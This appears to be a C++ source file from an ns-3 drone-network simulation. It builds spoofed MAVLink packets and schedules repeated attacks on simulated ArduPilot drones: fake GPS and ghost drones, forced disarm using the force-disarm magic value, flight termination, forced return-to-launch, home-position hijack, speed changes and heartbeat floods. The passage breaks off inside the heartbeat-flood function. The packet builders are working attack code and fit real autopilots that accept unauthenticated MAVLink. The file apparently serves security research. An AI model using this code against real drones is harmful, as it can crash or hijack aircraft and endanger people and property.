#include "attacks.h"

#include "ns3/wifi-module.h"
#include "ns3/mobility-module.h"
#include "ns3/applications-module.h"
#include "ns3/udp-socket-factory.h"
#include "ns3/netanim-module.h"

#include <common/mavlink.h>
#include <cmath>
#include <cstring>
#include <algorithm>
#include <sstream>

NS_LOG_COMPONENT_DEFINE("Attacks");


// In mavlink 
/*
System ID	-> Identifies the sending system (drone, GCS)
Component ID	-> Identifies the sending component (autopilot, gimbal, camera, etc.)	
target_system  -> (if present in payload, e.g. COMMAND_LONG)	Tells which system the command is for
target_component -> (if present in payload, e.g. COMMAND_LONG) Tells which component of that system is the target	

Example when Arm the drone 

System ID = 255 (GCS)  as a packet header
Component ID = 0 (GCS component) as a packet header
target_system = 1 (Drone #1) as a packet payload
target_component = 1 (Autopilot) as packet payload 

*/

// Create MAVLink Mission Item packet that sends a waypoint command to a target drone 
// This Function will be used by drone SysID 1 to command drones to go to a spesific waypoint
/*
An attacker can use this function to send malicious or incorrect MAVLink mission items or waypoints, 
potentially causing the drone to travel to unintended locations or become isolated from the network of other drones.
*/
std::vector<uint8_t> CreateMavlinkMissionPacket(uint8_t target_system, uint8_t target_component,
                                         float lat, float lon, float alt) {
    mavlink_message_t msg;
    uint8_t system_id = 1;   // Drone 0 (sender) spoof that missions comes form drone 0(system_id 1)
    uint8_t component_id = 1; // Component ID

    // Initialize mission item structure
    mavlink_mission_item_t mission_item = {0};
    mission_item.target_system = target_system;
    mission_item.target_component = target_component;
    mission_item.seq = 0;
    mission_item.frame = MAV_FRAME_GLOBAL_RELATIVE_ALT;
    mission_item.command = MAV_CMD_NAV_WAYPOINT;
    mission_item.current = 0;
    mission_item.autocontinue = 1;
    mission_item.param1 = 0; // Hold time (seconds)
    mission_item.param2 = 0; // Acceptance radius (meters)
    mission_item.param3 = 0; // Pass through waypoint
    mission_item.param4 = 0; // Yaw angle (NaN for unchanged)
    mission_item.x = lat;
    mission_item.y = lon;
    mission_item.z = alt;

    // Pack the message , Encode the MAVLink message 
    mavlink_msg_mission_item_encode(system_id, component_id, &msg, &mission_item);

    // Serialize to byte vector
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
   
    return std::vector<uint8_t>(buffer, buffer + len);
}

// A False Data Injection Attack that allows an attacker to send a fake GPS_RAW_INT MAVLink packet
// for a specific drone. This can be used to spoof the drone's position, altitude, and movement data,
// tricking the drone into believing it is at a false location.
std::vector<uint8_t> CreateFakeGPS_RAW_INT_Packet(uint8_t droneId, double lat, double lon, double alt) {
    
    mavlink_message_t msg; // MAVLink message container
    
    uint8_t system_id = droneId;   // Drone System ID 
    uint8_t component_id = 0;     
    
    mavlink_gps_raw_int_t gps = {}; // MAVLink GPS data structure, initialized to zero
    
    gps.time_usec = 0;              // 0 -> not used
    gps.fix_type = 3;               // GPS fix type (3 = 3D fix, considered reliable)
    gps.lat = static_cast<int32_t>(lat * 1e7); // Latitude in degrees scaled to integer
    gps.lon = static_cast<int32_t>(lon * 1e7); // Longitude in degrees scaled to integer
    gps.alt = static_cast<int32_t>(alt * 1000); // Altitude in millimeters
    gps.eph = 100;                  // Horizontal dilution of precision (HDOP)
    gps.epv = 100;                  // Vertical dilution of precision (VDOP)
    gps.vel = 0;                    // Ground speed in cm/s , 0 -> not used
    gps.cog = 0;                    // Course over ground, 0 -> not used
    gps.satellites_visible = 12;    // Number of visible satellites, Increases chance the drone trusts the fake GPS
    
    // Encode the GPS data into a MAVLink message
    mavlink_msg_gps_raw_int_encode(system_id, component_id, &msg, &gps);
    
    // Serialize to byte vector
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
   
    return std::vector<uint8_t>(buffer, buffer + len);
}

// Creates GPS packets for non-existent drones
// This function generates a spoofed GPS packet for a drone with a given system ID.
// The packet contains random GPS coordinates within 1km of the reference point.
// It can be used to simulate GPS data for drones that are not actually present in the simulation
std::vector<uint8_t> CreateSpoofedDroneGpsPacket(uint8_t spoofedSystemId) {
    mavlink_message_t msg;
    uint8_t component_id = 0;
    
    // Random position within 1km of reference point
    double lat = s_refLat + ((rand() % 2000 - 1000) / 100000.0); 
    double lon = s_refLon + ((rand() % 2000 - 1000) / 100000.0);
    double alt = 30 + (rand() % 100);
    
    mavlink_gps_raw_int_t gps = {};
    gps.fix_type = 3;
    gps.lat = static_cast<int32_t>(lat * 1e7);
    gps.lon = static_cast<int32_t>(lon * 1e7);
    gps.alt = static_cast<int32_t>(alt * 1000);
    gps.eph = 150;
    gps.epv = 200;
    gps.vel = 500 + (rand() % 1000);  // Random speed
    gps.cog = rand() % 36000;         // Random course
    gps.satellites_visible = 10 + (rand() % 6);

    mavlink_msg_gps_raw_int_encode(spoofedSystemId, component_id, &msg, &gps);
    
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    return std::vector<uint8_t>(buffer, buffer + len);
}


// Create a change speed command_long packet that will be used by attacker to change the speed of drones and make it move slower or faster to disturb its mission
std::vector<uint8_t> CreateChangeSpeedPacket(uint8_t target_system, float speedType, float speed) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker system ID (spoofed GCS)
    uint8_t component_id = 0;  // Component ID

    mavlink_command_long_t cmd = {};
    cmd.target_system    = target_system;  // ID of drone to affect either 1,2,3
    cmd.target_component = 0;      // 0 = main autopilot
    cmd.command          = MAV_CMD_DO_CHANGE_SPEED;  // MAVLink command for changing speed
    cmd.confirmation     = 0;              // No confirmation sequence required

    cmd.param1 = speedType; // 0 = airspeed (speed through the air), 1 = groundspeed (speed over the ground)
    cmd.param2 = speed;     // Speed in m/s 
    cmd.param3 = 0;       
    cmd.param4 = 0;
    cmd.param5 = 0;
    cmd.param6 = 0;
    cmd.param7 = 0;

    // Encode MAVLink message
    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);

    // Convert to raw byte buffer
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    return std::vector<uint8_t>(buffer, buffer + len);
}

// This function creates a "Forced Return to Launch" (RTL) command packet
// that can be sent to a target drone to make it switch to RTL mode.
std::vector<uint8_t> CreateForcedReturnHomePacket(uint8_t target_system) {
    mavlink_message_t msg; 
    uint8_t system_id = 255;   // Attacker (spoofed GCS)
    uint8_t component_id = 0;  // Target component ID (0 = autopilot)

    // Set base_mode to indicate a custom mode change is requested
    uint8_t base_mode   = MAV_MODE_FLAG_CUSTOM_MODE_ENABLED; 
    uint32_t custom_mode = 6; // RTL mode in ArduCopter firmware
    // Can add any other mode 
    /*  STABILIZE =     0,  // manual airframe angle with manual throttle
        ACRO =          1,  // manual body-frame angular rate with manual throttle
        ALT_HOLD =      2,  // manual airframe angle with automatic throttle
        AUTO =          3,  // fully automatic waypoint control using mission commands
        GUIDED =        4,  // fully automatic fly to coordinate or fly at velocity/direction using GCS immediate commands
        LOITER =        5,  // automatic horizontal acceleration with automatic throttle
        RTL =           6,  // automatic return to launching point
        CIRCLE =        7,  // automatic circular flight with automatic throttle
        LAND =          9,  // automatic landing with horizontal position control
        DRIFT =        11,  // semi-autonomous position, yaw and throttle control
        SPORT =        13,  // manual earth-frame angular rate control with manual throttle
        FLIP =         14,  // automatically flip the vehicle on the roll axis
        AUTOTUNE =     15,  // automatically tune the vehicle's roll and pitch gains
        POSHOLD =      16,  // automatic position hold with manual override, with automatic throttle
        BRAKE =        17,  // full-brake using inertial/GPS system, no pilot input
        THROW =        18,  // throw to launch mode using inertial/GPS system, no pilot input
        AVOID_ADSB =   19,  // automatic avoidance of obstacles in the macro scale - e.g. full-sized aircraft
        GUIDED_NOGPS = 20,  // guided mode but only accepts attitude and altitude
        SMART_RTL =    21,  // SMART_RTL returns to home by retracing its steps
        FLOWHOLD  =    22,  // FLOWHOLD holds position with optical flow without rangefinder
        FOLLOW    =    23,  // follow attempts to follow another vehicle or ground station
        ZIGZAG    =    24,  // ZIGZAG mode is able to fly in a zigzag manner with predefined point A and point B
        SYSTEMID  =    25,  // System ID mode produces automated system identification signals in the controllers
        AUTOROTATE =   26,  // Autonomous autorotation
        AUTO_RTL =     27,  // Auto RTL, this is not a true mode, AUTO will report as this mode if entered to perform a DO_LAND_START Landing sequence
        TURTLE =       28,  // Flip over after crash
        */

    // Populate MAVLink SET_MODE message
    mavlink_set_mode_t set_mode = {};
    set_mode.target_system = target_system; // The drone to send the command to
    set_mode.base_mode = base_mode;         // Mode flags
    set_mode.custom_mode = custom_mode;     // Custom mode value (RTL)

    // Encode the message into MAVLink format
    mavlink_msg_set_mode_encode(system_id, component_id, &msg, &set_mode);

    // Serialize the MAVLink message into a raw byte buffer
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    // Return as a byte vector ready to be sent over a communication channel
    return std::vector<uint8_t>(buffer, buffer + len);
}


// This function creates a forced disarm MAVLink packet
// It can be used by an attacker to disarm a drone remotely
std::vector<uint8_t> CreateForcedDisarmPacket(uint8_t target_system) {
    mavlink_message_t msg;             
    uint8_t system_id = 255;           // Attacker (spoofed GCS)
    uint8_t component_id = 0;          

    mavlink_command_long_t cmd = {};   // Structure for COMMAND_LONG message
    cmd.target_system = target_system; // ID of the drone to target
    cmd.target_component = 0;         
    cmd.command = MAV_CMD_COMPONENT_ARM_DISARM; // Command to arm/disarm the drone
    cmd.confirmation = 0;              //no confirmation needed
    cmd.param1 = 0.0;                  // 0 = disarm, 1 = arm
    cmd.param2 = 21196;                 // Force disarm magic number -> https://github.com/ArduPilot/ardupilot/blob/b316b3ab46074d2499c0143cd2fdc7c69dc5a8a9/libraries/GCS_MAVLink/GCS.h#L728-L729 (magic_force_disarm_value)
    cmd.param3 = 0;                    
    cmd.param4 = 0;                    
    cmd.param5 = 0;                   
    cmd.param6 = 0;                   
    cmd.param7 = 0;                    

    // Encode the COMMAND_LONG into a MAVLink message
    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);

    // Serialize the message into a raw byte buffer
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);

    // Return the serialized MAVLink packet as a vector
    return std::vector<uint8_t>(buffer, buffer + len);
}

// This function creates a flight termination command to be send to a target_system
// Drones will terminate their flight when they receive this command
std::vector<uint8_t> CreateFlightTerminationPacket(uint8_t target_system) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker (spoofed GCS)
    // system ID 255 is generally used as a "GCS" (Ground Control Station) 
    uint8_t component_id = 0;  // Component ID
    mavlink_command_long_t cmd = {};
    cmd.target_system = target_system;
    cmd.target_component = 0;
    cmd.command = MAV_CMD_DO_FLIGHTTERMINATION;
    cmd.confirmation = 0;
    cmd.param1 = 1.0;  // Termination enabled (1 = true)
    cmd.param2 = 0;
    cmd.param3 = 0;
    cmd.param4 = 0;
    cmd.param5 = 0;
    cmd.param6 = 0;
    cmd.param7 = 0;

    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);
    
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    
    return std::vector<uint8_t>(buffer, buffer + len);
}

// Create SET_HOME_POSITION MAVLink packet
// This function creates a MAVLink packet to set the home position of a drone
// It can be used by an attacker to change the home position of a drone, potentially causing it to return to an unintended location. 
// In this case attacker will send home position relative to his location to hijack the drone      
std::vector<uint8_t> CreateSetHomePositionPacket(uint8_t target_system, double lat, double lon, double alt) {
    mavlink_message_t msg;
    uint8_t system_id = 255;   // Attacker (spoofed GCS)
    uint8_t component_id = 0;  // Component ID

    mavlink_command_long_t cmd = {};
    cmd.target_system = target_system;
    cmd.target_component = 0;      // Target autopilot
    cmd.command = MAV_CMD_DO_SET_HOME;  // Command ID for setting home position
    cmd.confirmation = 0;          // No confirmation needed
    cmd.param1 = 0.0f;             // 0 = use specified location
    cmd.param2 = 0.0f;             // Reserved (unused)
    cmd.param3 = 0.0f;             // Reserved (unused)
    cmd.param4 = 0.0f;             // Reserved (unused)
    cmd.param5 = static_cast<float>(lat);  // Latitude in degrees
    cmd.param6 = static_cast<float>(lon);  // Longitude in degrees
    cmd.param7 = static_cast<float>(alt);  // Altitude in meters (AMSL)

    // Encode the COMMAND_LONG message
    mavlink_msg_command_long_encode(system_id, component_id, &msg, &cmd);

    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    return std::vector<uint8_t>(buffer, buffer + len);
}
// Create a MAVLink HEARTBEAT message to flood the target drone
// This function generates a MAVLink HEARTBEAT packet that can be used to flood a target
std::vector<uint8_t> CreateHeartbeatPacket(uint8_t system_id) {
    mavlink_message_t msg;
    uint8_t component_id = 0;  // Typically 0 for autopilot

    mavlink_heartbeat_t heartbeat = {};
    heartbeat.type = MAV_TYPE_QUADROTOR;
    heartbeat.autopilot = MAV_AUTOPILOT_ARDUPILOTMEGA;
    heartbeat.base_mode = 0;
    heartbeat.custom_mode = 0;
    heartbeat.system_status = MAV_STATE_ACTIVE;

    mavlink_msg_heartbeat_encode(system_id, component_id, &msg, &heartbeat);

    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    
    return std::vector<uint8_t>(buffer, buffer + len);
}

// Create a MAVLink GLOBAL_POSITION_INT message for QGroundControl spoofing
std::vector<uint8_t> CreateQgcLocationSpoofPacket(uint8_t system_id, double lat, double lon, double alt) {
    mavlink_message_t msg;
    uint8_t component_id = 0;  // Typically 0 for autopilot

    // Calculate time since boot (monotonic)
    static auto start_time = std::chrono::steady_clock::now();
    auto now = std::chrono::steady_clock::now();
    uint32_t time_boot_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time).count();
    
    mavlink_global_position_int_t global_pos = {};
    global_pos.time_boot_ms = time_boot_ms;
    global_pos.lat = static_cast<int32_t>(lat * 1e7);  // Latitude in degrees * 1e7
    global_pos.lon = static_cast<int32_t>(lon * 1e7);  // Longitude in degrees * 1e7
    global_pos.alt = static_cast<int32_t>(alt * 1000); // Altitude in millimeters
    global_pos.relative_alt = static_cast<int32_t>(alt * 1000); // Relative altitude in millimeters
    global_pos.vx = 0;  // Ground X Speed (Latitude, positive north)
    global_pos.vy = 0;  // Ground Y Speed (Longitude, positive east)
    global_pos.vz = 0;  // Ground Z Speed (Altitude, positive down)
    global_pos.hdg = 0; // Vehicle heading (yaw angle) in degrees * 100, 0..359.99 degrees

    mavlink_msg_global_position_int_encode(system_id, component_id, &msg, &global_pos);

    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    
    return std::vector<uint8_t>(buffer, buffer + len);
}


// Create a comprehensive set of MAVLink packets to simulate a spoofed drone
// This function generates a series of MAVLink packets that simulate a drone's presence and status
// It includes HEARTBEAT, SYS_STATUS, GPS_RAW_INT, and GLOBAL_POSITION_INT messages
// The packets are designed to make the spoofed drone appear as a legitimate entity in the network
std::vector<std::vector<uint8_t>> CreateComprehensiveSpoofedDronePackets(uint8_t system_id, double lat, double lon, double alt_m)
{
    std::vector<std::vector<uint8_t>> packets;
    packets.reserve(4);

    // Use NS-3 sim time so packets look consistent in replays
    const uint32_t time_boot_ms = (uint32_t)ns3::Simulator::Now().GetMilliSeconds();
    const uint64_t time_usec    = (uint64_t)time_boot_ms * 1000ULL;

    //HEARTBEAT 
    {
        mavlink_message_t msg{};
        mavlink_heartbeat_t hb{};
        hb.type          = MAV_TYPE_QUADROTOR;
        hb.autopilot     = MAV_AUTOPILOT_ARDUPILOTMEGA;
        hb.base_mode     = 0;
        hb.custom_mode   = 0;
        hb.system_status = MAV_STATE_ACTIVE;

        mavlink_msg_heartbeat_encode(system_id, /*compid*/1, &msg, &hb);
        uint8_t buf[MAVLINK_MAX_PACKET_LEN];
        const uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
        packets.emplace_back(buf, buf + len);
    }

    //SYS_STATUS
    {
        mavlink_message_t msg{};
        mavlink_sys_status_t st{};
        st.onboard_control_sensors_present = 0;
        st.onboard_control_sensors_enabled = 0;
        st.onboard_control_sensors_health  = 0;
        st.load             = 500;    // 50.0%
        st.voltage_battery  = 16800;  // 16.8 V (mV)
        st.current_battery  = 10000;  // 10 A (cA)
        st.battery_remaining= 80;     // 80%
        st.drop_rate_comm   = 0;
        st.errors_comm      = 0;
        st.errors_count1    = 0;
        st.errors_count2    = 0;
        st.errors_count3    = 0;
        st.errors_count4    = 0;

        mavlink_msg_sys_status_encode(system_id, /*compid*/1, &msg, &st);
        uint8_t buf[MAVLINK_MAX_PACKET_LEN];
        const uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
        packets.emplace_back(buf, buf + len);
    }

    // Convert units once
    const int32_t lat_e7 = (int32_t)std::llround(lat * 1e7);
    const int32_t lon_e7 = (int32_t)std::llround(lon * 1e7);
    const int32_t alt_mm = (int32_t)std::llround(alt_m * 1000.0);

    // GPS_RAW_INT 
    {
        mavlink_message_t msg{};
        mavlink_gps_raw_int_t gps{};
        gps.time_usec          = time_usec;  // python used time_boot_ms; use usec for realism
        gps.fix_type           = 3;          // 3D fix
        gps.lat                = lat_e7;
        gps.lon                = lon_e7;
        gps.alt                = alt_mm;
        gps.eph                = 100;        // HDOP*100 (arbitrary)
        gps.epv                = 150;        // VDOP*100 (arbitrary)
        gps.vel                = 0;
        gps.cog                = 0;
        gps.satellites_visible = 12;

        mavlink_msg_gps_raw_int_encode(system_id, /*compid*/1, &msg, &gps);
        uint8_t buf[MAVLINK_MAX_PACKET_LEN];
        const uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
        packets.emplace_back(buf, buf + len);
    }

    // GLOBAL_POSITION_INT 
    {
        mavlink_message_t msg{};
        mavlink_global_position_int_t gp{};
        gp.time_boot_ms = time_boot_ms;
        gp.lat          = lat_e7;
        gp.lon          = lon_e7;
        gp.alt          = alt_mm;
        gp.relative_alt = alt_mm;
        gp.vx           = 0;
        gp.vy           = 0;
        gp.vz           = 0;
        gp.hdg          = 0;

        mavlink_msg_global_position_int_encode(system_id, /*compid*/1, &msg, &gp);
        uint8_t buf[MAVLINK_MAX_PACKET_LEN];
        const uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
        packets.emplace_back(buf, buf + len);
    }

    return packets;
}


// Creates a spoofed BATTERY_STATUS MAVLink packet
std::vector<uint8_t> CreateSpoofedBatteryStatusPacket(uint8_t target_system, uint8_t battery_id, uint8_t battery_function, uint8_t battery_type,int16_t temperature, uint16_t voltage, int16_t current_battery, int32_t current_consumed,int32_t energy_consumed, int8_t battery_remaining) {
    mavlink_message_t msg;
    uint8_t system_id = target_system;   // Use the target system ID as sender (spoofing)
    uint8_t component_id = 0;            // Component ID

    mavlink_battery_status_t battery_status = {};
    battery_status.id = battery_id;
    battery_status.battery_function = battery_function;
    battery_status.type = battery_type;
    battery_status.temperature = temperature;
    
    // Set voltages (only first cell, others as 65535)
    battery_status.voltages[0] = voltage;
    for (int i = 1; i < 10; i++) {
        battery_status.voltages[i] = 65535; // Unknown
    }
    
    battery_status.current_battery = current_battery;
    battery_status.current_consumed = current_consumed;
    battery_status.energy_consumed = energy_consumed;
    battery_status.battery_remaining = battery_remaining;

    mavlink_msg_battery_status_encode(system_id, component_id, &msg, &battery_status);
    
    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
    return std::vector<uint8_t>(buffer, buffer + len);
}




//-------------------------------------------------------------------------Execute Attacks Functions-----------------------------------------------------

// Function to execute flight termination attack on drones 1 and 2 
void ExecuteFlightTerminationAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateFlightTerminationPacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateFlightTerminationPacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteFlightTerminationAttack, socket);
    }
}
// Function to execute force disarm attack on drones 1 and 2
void ExecuteForceDisarmAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateForcedDisarmPacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateForcedDisarmPacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteForceDisarmAttack, socket);
    }
}

// Function to execute force return to land (return home) attack on drones 1 and 2
void ExecuteForceRTLAttack(Ptr<Socket> socket) {
    // Attack drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> term1 = CreateForcedReturnHomePacket(2); // Drone1 sysid=2
    std::vector<uint8_t> term2 = CreateForcedReturnHomePacket(3); // Drone2 sysid=3
    
    Ptr<Packet> packet1 = Create<Packet>(term1.data(), term1.size());
    Ptr<Packet> packet2 = Create<Packet>(term2.data(), term2.size()); 
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent flight termination commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ to parse them later and forward to drones
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(term1.data(), term1.size());
        zmq::message_t zmqMsg2(term2.data(), term2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
        NS_LOG_INFO("Published attack commands to ZMQ 5555");
    }
    
    // Schedule next attack (every 1 seconds) to keep the attack ongoing and prevent drones from recovering
    if (Simulator::Now().GetSeconds() < 100.0) {
        Simulator::Schedule(Seconds(1.0), &ExecuteForceRTLAttack, socket);
    }
}

// Execute GPS spoofed positon for actual drones (1,2,3) attack
/**
Every drone receives spoofed positions for all other drones
Packets appear to come from legitimate drones (via spoofed system_id)
 */
// This attack is in the network layer and will not be forwarded to zmq and parsed by the mavlink parser
// It will be sent directly to the drones via UDP sockets
void Execute_GPS_RAW_INT_SpoofingAttack(Ptr<Socket> socket) {
    double fakeLat = 50; // fixed latitude for spoofing
    double fakeLon = 50; // fixed longitude for spoofing 
    double fakeAlt = 50; // fixed altitude for spoofing

    // Spoof positions for ALL drones (0,1,2)
    for (uint8_t spoofedDroneId = 0; spoofedDroneId <= 2; spoofedDroneId++) {
        // Create fake GPS for this drone
        std::vector<uint8_t> fakeGps = CreateFakeGPS_RAW_INT_Packet(
            spoofedDroneId + 1,  // system_id: drone0=1, drone1=2, drone2=3
            fakeLat, fakeLon, fakeAlt
        );
        Ptr<Packet> packet = Create<Packet>(fakeGps.data(), fakeGps.size());
        
        // Send to ALL drones EXCEPT the spoofed drone itself
        for (uint32_t targetDroneIdx = 0; targetDroneIdx < 3; targetDroneIdx++) {
            if (targetDroneIdx == spoofedDroneId) continue; // Skip spoofed drone
            
            socket->SendTo(
                packet, 
                0, 
                InetSocketAddress(droneIpAddresses[targetDroneIdx], 20000)
            );
        }
    }
    
    NS_LOG_INFO("Attacker sent network-wide fake GPS at " << Simulator::Now().GetSeconds() << "s");
    Simulator::Schedule(Seconds(0.2), &Execute_GPS_RAW_INT_SpoofingAttack, socket);
}

// Attack execution function
// This function floods the network with spoofed droness GPS packets for non-existent drones
// It creates fake GPS packets for drones with system IDs 4 to 10 and sends them
// its also send to broadcast address to reach all drones in the network
void ExecuteSpoofedDroneFloodAttack(ns3::Ptr<ns3::Socket> socket)
{
    NS_LOG_INFO("Executing spoofed drone flood attack at " << ns3::Simulator::Now().GetSeconds() << "s");

    // Canberra base (ArduPilot defaults)
    static const double base_lat = -35.363261;
    static const double base_lon = 149.165230;

    // sysid -> (dlat, dlon, alt_m)
    static const std::map<uint8_t, std::tuple<double,double,double>> kGhosts = {
        {4,  { 0.0000,  0.0000, 584.0}},
        {5,  { 0.0001,  0.0000, 600.0}},
        {6,  {-0.0001,  0.0000, 620.0}},
        {7,  { 0.0000,  0.0001, 640.0}},
        {8,  { 0.0000, -0.0001, 660.0}},
        {9,  { 0.0002,  0.0000, 680.0}},
        {10, {-0.0002,  0.0000, 700.0}},
    };

    for (const auto& kv : kGhosts) {
        const uint8_t sysid = kv.first;
        const double dlat   = std::get<0>(kv.second);
        const double dlon   = std::get<1>(kv.second);
        const double alt_m  = std::get<2>(kv.second);

        const double lat = base_lat + dlat;
        const double lon = base_lon + dlon;

        // Build the four packets, in the same order as Python
        auto pkts = CreateComprehensiveSpoofedDronePackets(sysid, lat, lon, alt_m);

        for (const auto& blob : pkts) {
            // Send to every real drone (UDP 20000)
            for (const auto& ip : droneIpAddresses) {
                ns3::Ptr<ns3::Packet> p = ns3::Create<ns3::Packet>(blob.data(), blob.size());
                socket->SendTo(p, 0, ns3::InetSocketAddress(ip, 20000));
            }

            // Also publish raw bytes to ZMQ (for QGC forwarder)
            if (g_commandPublisher) {
                try {
                    zmq::message_t m(blob.size());
                    std::memcpy(m.data(), blob.data(), blob.size());
                    g_commandPublisher->send(m, zmq::send_flags::none);
                } catch (const zmq::error_t& e) {
                    NS_LOG_ERROR("ZMQ send error: " << e.what());
                }
            }
        }

        NS_LOG_INFO("Spoofed drone sysid=" << (int)sysid
                    << " lat=" << lat << " lon=" << lon << " alt_m=" << alt_m);
    }

    // Re-run every 0.5s up to 180s
    if (ns3::Simulator::Now().GetSeconds() < 180.0) {
        ns3::Simulator::Schedule(ns3::Seconds(0.5), &ExecuteSpoofedDroneFloodAttack, socket);
    }
}
// Execute home position hijack attack
// This function sends SET_HOME_POSITION commands to drones 1 and 2
// It sets their home position to the attacker's location, potentially causing them to return to the attacker's position
// This can be used to hijack the drones and make them return to the attacker's location
// Its scheduled to run every 1 second for 3 minutes (180 seconds)
void ExecuteSetHomeAttack(Ptr<Socket> socket) {
    // Calculate attacker's GPS coordinates (from main.cc position)
    double attackerLat = s_refLat + (100.0 / s_metersPerDegreeLat);  // y=100m -> lat
    double attackerLon = s_refLon + (100.0 / s_metersPerDegreeLon); // x=100m -> lon
    double attackerAlt = s_refAlt + 0.0;                          // z=0m

    // Create packets for drones 1 and 2 (sysid 2 and 3)
    std::vector<uint8_t> home1 = CreateSetHomePositionPacket(2, attackerLat, attackerLon, attackerAlt);
    std::vector<uint8_t> home2 = CreateSetHomePositionPacket(3, attackerLat, attackerLon, attackerAlt);

    Ptr<Packet> packet1 = Create<Packet>(home1.data(), home1.size());
    Ptr<Packet> packet2 = Create<Packet>(home2.data(), home2.size());
    
    // Send to drone1 and drone2
    socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[1], 5551));
    socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[2], 5552));
    
    NS_LOG_INFO("Attacker sent SET_HOME_POSITION commands at " 
                << Simulator::Now().GetSeconds() << "s");
    
    // Publish to ZMQ
    if (g_commandPublisher) {
        zmq::message_t zmqMsg1(home1.data(), home1.size());
        zmq::message_t zmqMsg2(home2.data(), home2.size());
        g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
        g_commandPublisher->send(zmqMsg2, zmq::send_flags::none);
    }
    
    // Schedule next flood (every 1 seconds)
    if (Simulator::Now().GetSeconds() < 180.0) {
        Simulator::Schedule(Seconds(1), &ExecuteSetHomeAttack, socket);
    }
}

// Execute heartbeat flood attack with realistic packets
void ExecuteHeartbeatFloodAttack(Ptr<Socket> socket) {
    // Create realistic heartbeat packets for multiple spoofed drones
    for (uint8_t spoofed_id = 4; spoofed_id <= 20; spoofed_id++) {
